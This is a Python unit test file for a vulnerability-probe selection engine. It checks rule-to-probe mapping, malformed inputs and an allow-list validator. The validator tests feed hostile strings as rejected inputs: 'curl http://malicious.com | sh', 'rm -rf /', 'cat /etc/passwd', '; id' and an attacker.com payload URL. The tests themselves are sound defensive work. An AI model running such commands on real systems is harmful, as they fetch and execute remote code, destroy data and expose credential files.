"""
tests/test_reasoning.py
=======================
Automated unit tests for the VerifiX offline reasoning engine
in backend/claude_reasoning.py.

Verifies:
1. Mapping of static rules (AUTH001, PY002, PY003) to fixed probe IDs.
2. Safe fallbacks for unknown, unsupported, or malformed rule inputs.
3. Strict allow-list validation guarding against arbitrary probe IDs, URLs, and shell commands.
4. Determinism of reasoning outputs.
5. Finding dictionary ingestion and batch processing.
"""

from __future__ import annotations

import os
import sys
import pytest

# Ensure backend/ is in sys.path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from claude_reasoning import (
    REGISTERED_PROBE_IDS,
    RULE_PROBE_MAPPING,
    VulnerabilityHypothesis,
    generate_hypothesis,
    generate_hypotheses_for_findings,
    get_registered_probe_ids,
    is_valid_probe_id,
    validate_probe_ids,
)


# ===========================================================================
# 1. Rule -> Probe Mapping Tests (AUTH001, PY002, PY003)
# ===========================================================================

class TestRuleProbeMapping:

    def test_auth001_selects_exactly_bola_probe(self):
        """AUTH001 must select exactly PROBE-BOLA-001 with high confidence."""
        result = generate_hypothesis("AUTH001")
        assert isinstance(result, VulnerabilityHypothesis)
        assert result.finding_rule == "AUTH001"
        assert result.selected_probe_ids == ["PROBE-BOLA-001"]
        assert result.confidence == "high"
        assert "BOLA" in result.hypothesis or "authorization" in result.hypothesis.lower()
        assert len(result.reasoning) > 0

    def test_py002_selects_exactly_path_traversal_probes(self):
        """PY002 must select PROBE-PT-001 and PROBE-PT-002."""
        result = generate_hypothesis("PY002")
        assert result.finding_rule == "PY002"
        assert result.selected_probe_ids == ["PROBE-PT-001", "PROBE-PT-002"]
        assert result.confidence == "high"
        assert "traversal" in result.hypothesis.lower() or "path" in result.hypothesis.lower()

    def test_py003_selects_exactly_sql_probes(self):
        """PY003 must select PROBE-SQL-001 and PROBE-SQL-002."""
        result = generate_hypothesis("PY003")
        assert result.finding_rule == "PY003"
        assert result.selected_probe_ids == ["PROBE-SQL-001", "PROBE-SQL-002"]
        assert result.confidence == "high"
        assert "sql" in result.hypothesis.lower()


# ===========================================================================
# 2. Unknown and Unsupported Rule Handling
# ===========================================================================

class TestUnknownRules:

    def test_unknown_rule_string_returns_no_probes(self):
        """An arbitrary unrecognized rule string returns no selected probes and low confidence."""
        result = generate_hypothesis("CUSTOM_UNKNOWN_999")
        assert result.finding_rule == "CUSTOM_UNKNOWN_999"
        assert result.selected_probe_ids == []
        assert result.confidence == "low"
        assert "no automated runtime validation probe" in result.hypothesis.lower()

    def test_unsupported_scanner_rules_return_no_probes(self):
        """Scanner rules without registered runtime probes (PY001, PY004, PY005) return safe defaults."""
        for rule in ["PY001", "PY004", "PY005"]:
            result = generate_hypothesis(rule)
            assert result.finding_rule == rule
            assert result.selected_probe_ids == []
            assert result.confidence == "low"


# ===========================================================================
# 3. Malformed Inputs
# ===========================================================================

class TestMalformedInputs:

    def test_none_input_returns_no_probes(self):
        result = generate_hypothesis(None)
        assert result.selected_probe_ids == []
        assert result.confidence == "low"

    def test_integer_input_returns_no_probes(self):
        result = generate_hypothesis(12345)
        assert result.selected_probe_ids == []
        assert result.confidence == "low"

    def test_empty_string_input_returns_no_probes(self):
        result = generate_hypothesis("")
        assert result.selected_probe_ids == []
        assert result.confidence == "low"

    def test_whitespace_string_input_returns_no_probes(self):
        result = generate_hypothesis("    ")
        assert result.selected_probe_ids == []
        assert result.confidence == "low"

    def test_boolean_input_returns_no_probes(self):
        result = generate_hypothesis(True)
        assert result.selected_probe_ids == []
        assert result.confidence == "low"


# ===========================================================================
# 4. Strict Probe Allow-List & Validation Guardrails
# ===========================================================================

class TestProbeValidationGuardrails:

    def test_every_registered_probe_id_passes_validation(self):
        """All predefined registered probe IDs must pass is_valid_probe_id and validate_probe_ids."""
        assert len(REGISTERED_PROBE_IDS) == 5
        for pid in REGISTERED_PROBE_IDS:
            assert is_valid_probe_id(pid) is True
        validated = validate_probe_ids(list(REGISTERED_PROBE_IDS))
        assert set(validated) == set(REGISTERED_PROBE_IDS)

    def test_arbitrary_unregistered_probe_id_rejected(self):
        """Unregistered probe IDs with PROBE- prefix must still be rejected."""
        assert is_valid_probe_id("PROBE-FAKE-001") is False
        with pytest.raises(ValueError, match="Rejected probe ID"):
            validate_probe_ids(["PROBE-FAKE-001"])

    def test_url_as_probe_id_rejected(self):
        """URLs must never be accepted as probe IDs."""
        urls = [
            "http://127.0.0.1:5001/files",
            "https://attacker.com/payload",
            "http://localhost/admin",
        ]
        for url in urls:
            assert is_valid_probe_id(url) is False
            with pytest.raises(ValueError, match="Rejected probe ID"):
                validate_probe_ids([url])

    def test_shell_command_as_probe_id_rejected(self):
        """Shell command strings must be strictly rejected."""
        commands = [
            "rm -rf /",
            "cat /etc/passwd",
            "; id",
            "curl http://malicious.com | sh",
        ]
        for cmd in commands:
            assert is_valid_probe_id(cmd) is False
            with pytest.raises(ValueError, match="Rejected probe ID"):
                validate_probe_ids([cmd])

    def test_probe_id_with_whitespace_rejected(self):
        """Probe IDs with leading/trailing whitespace must be rejected."""
        assert is_valid_probe_id(" PROBE-PT-001 ") is False
        with pytest.raises(ValueError, match="whitespace"):
            validate_probe_ids([" PROBE-PT-001 "])

    def test_non_string_in_probe_ids_raises_value_error(self):
        with pytest.raises(ValueError, match="Probe ID must be a string"):
            validate_probe_ids([123])

    def test_non_iterable_probe_ids_raises_type_error(self):
        with pytest.raises(TypeError, match="Expected iterable"):
            validate_probe_ids(123)  # type: ignore

    def test_get_registered_probe_ids_returns_sorted_list(self):
        pids = get_registered_probe_ids()
        assert isinstance(pids, list)
        assert pids == sorted(REGISTERED_PROBE_IDS)


# ===========================================================================
# 5. Deterministic Behavior & Data Structure Compatibility
# ===========================================================================

class TestDeterministicBehavior:

    def test_repeated_calls_return_identical_dictionaries(self):
        """Multiple calls for the same rule must return identical dictionary representations."""
        for rule in ["AUTH001", "PY002", "PY003", "UNKNOWN"]:
            h1 = generate_hypothesis(rule).to_dict()
            h2 = generate_hypothesis(rule).to_dict()
            assert h1 == h2

    def test_subscript_access_matches_attribute_access(self):
        """VulnerabilityHypothesis must support both attribute access and dict indexing."""
        h = generate_hypothesis("AUTH001")
        assert h["finding_rule"] == h.finding_rule
        assert h["selected_probe_ids"] == h.selected_probe_ids
        assert h["confidence"] == h.confidence
        assert h["hypothesis"] == h.hypothesis
        assert h["reasoning"] == h.reasoning


# ===========================================================================
# 6. Finding Dictionary Ingestion
# ===========================================================================

class TestFindingDictionaryHandling:

    def test_finding_dict_with_rule_field_handled(self):
        """A finding dictionary containing a 'rule' key is handled identically to the rule string."""
        finding = {
            "rule": "AUTH001",
            "type": "Possible missing authorization check",
            "line": 21,
            "evidence": "Route accesses DOCUMENTS without an obvious ownership check",
            "severity": "medium",
        }
        result = generate_hypothesis(finding)
        assert result.finding_rule == "AUTH001"
        assert result.selected_probe_ids == ["PROBE-BOLA-001"]
        assert result.confidence == "high"

    def test_finding_dict_with_unknown_rule_handled(self):
        finding = {"rule": "NONEXISTENT_RULE", "line": 42}
        result = generate_hypothesis(finding)
        assert result.finding_rule == "NONEXISTENT_RULE"
        assert result.selected_probe_ids == []
        assert result.confidence == "low"

    def test_finding_dict_missing_rule_key(self):
        finding = {"type": "Missing rule key", "line": 1}
        result = generate_hypothesis(finding)
        assert result.selected_probe_ids == []
        assert result.confidence == "low"


# ===========================================================================
# 7. Batch Hypotheses Generation (generate_hypotheses_for_findings)
# ===========================================================================

class TestBatchHypothesesGeneration:

    def test_generate_hypotheses_for_findings_list(self):
        """Batch generation accepts a list of finding dicts/strings and returns matching hypotheses."""
        findings = [
            {"rule": "AUTH001", "line": 10},
            "PY002",
            {"rule": "PY003", "line": 50},
            {"rule": "UNKNOWN_RULE", "line": 99},
        ]
        results = generate_hypotheses_for_findings(findings)
        assert len(results) == 4
        assert results[0].selected_probe_ids == ["PROBE-BOLA-001"]
        assert results[1].selected_probe_ids == ["PROBE-PT-001", "PROBE-PT-002"]
        assert results[2].selected_probe_ids == ["PROBE-SQL-001", "PROBE-SQL-002"]
        assert results[3].selected_probe_ids == []

    def test_empty_findings_list_returns_empty(self):
        assert generate_hypotheses_for_findings([]) == []

    def test_non_iterable_findings_returns_empty(self):
        assert generate_hypotheses_for_findings(None) == []  # type: ignore
        assert generate_hypotheses_for_findings(12345) == []  # type: ignore
